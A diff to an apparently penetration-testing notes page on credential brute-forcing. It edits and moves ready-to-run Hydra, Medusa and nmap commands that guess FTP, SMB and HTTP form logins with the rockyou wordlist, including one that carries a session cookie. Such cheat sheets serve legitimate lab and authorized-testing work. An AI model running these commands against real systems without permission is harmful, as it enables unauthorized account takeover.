@@ -18,23 +18,6 @@ checking all possible keys
 until the correct key is found.
 [^brute-force-wiki]
 
-There are several
-types of brute force attacks.
-[^testing-bf-owasp]
-
-- Dictionary Attack
-
-    Dictionary-based attacks consist of systematically test usernames and passwords from a dictionary file.
-
-- Search Attacks
-
-    Search attacks consist of testing possible combinations of a given character set with a given length range.
-
-- Rule-based Search Attacks
-
-    Rule-based attack consist of testing possible combinations based on rules which a particular system is based on.
-
-
 ## Default Credentials
 
 - [DefaultPassword](https://default-password.info/)
@@ -138,7 +121,7 @@ See [Combo (Colon Separated) Lists](#combo-colon-separated-lists).
 #### Hydra [^hydra]
 
 ```sh
-hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt.gz -f {{< param "war.rhost" >}} ftp
+hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt -f {{< param "war.rhost" >}} ftp
 ```
 
 {{<details "Parameters">}}
@@ -148,24 +131,11 @@ hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt.gz -f {{< param "war.rhost" 
 - `-f`: exit after the first found user/password pair.
 {{</details>}}
 
-#### Medusa [^medusa]
-
-```sh
-medusa -u ftp -P /usr/share/wordlists/rockyou.txt -h {{< param "war.rhost" >}} -M ftp
-```
-
-{{<details "Parameters">}}
-- `-u <user>`: login with `user` name.
-- `-P <passwords file>`: login with password from file.
-- `-h`: target hostname or IP address.
-- `-M`: module to execute.
-{{</details>}}
-
 ### SMB
 
 #### Hydra [^hydra]
 ```sh
-hydra -v -t1 -l Administrator -P /usr/share/wordlists/rockyou.txt.gz -f {{< param "war.rhost" >}} smb
+hydra -v -t1 -l Administrator -P /usr/share/wordlists/rockyou.txt -f {{< param "war.rhost" >}} smb
 ```
 {{<details "Parameters">}}
 - `-v`: verbose mode.
@@ -188,13 +158,13 @@ sudo nmap --script smb-brute -p U:137,T:139 {{< param "war.rhost" >}}
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} http-head /admin/
 ```
 
-### HTTP Digest Auth
+### HTTP Digest
 
 ```sh
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} http-get /admin/
 ```
 
-### HTML Form Based Auth
+### HTTP POST Form
 
 ```sh
 hydra -l admin -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
@@ -206,6 +176,19 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} h
 - `-P <passwords file>`: login with passwords from file.
 - `http-head | http-get | http-post-form`: service to attack.
 {{</details>}}
+
+### HTTP Authenticated POST Form
+
+Append the `Cookie` header
+with the session id
+to the options string,
+e.g.,
+`:H=Cookie\: security=low; PHPSESSID=if0kg4ss785kmov8bqlbusva3v`.
+[^hydra]
+
+```sh
+hydra -l admin -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"
+```
 
 ## Miscellaneous
 
@@ -246,19 +229,6 @@ medusa -C /tmp/cplist.txt -h {{< param "war.rhost" >}} -M ftp
 - `-h`: target hostname or IP address.
 - `-M`: module to execute.
 {{</details>}}
-
-### HTTP Authenticated Attack
-
-Append the `Cookie` header
-with the session id
-to the options string,
-e.g.,
-`:H=Cookie\: security=low; PHPSESSID=if0kg4ss785kmov8bqlbusva3v`.
-[^hydra]
-
-```sh
-hydra -l admin -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"
-```
 
 ## Further Reading
 
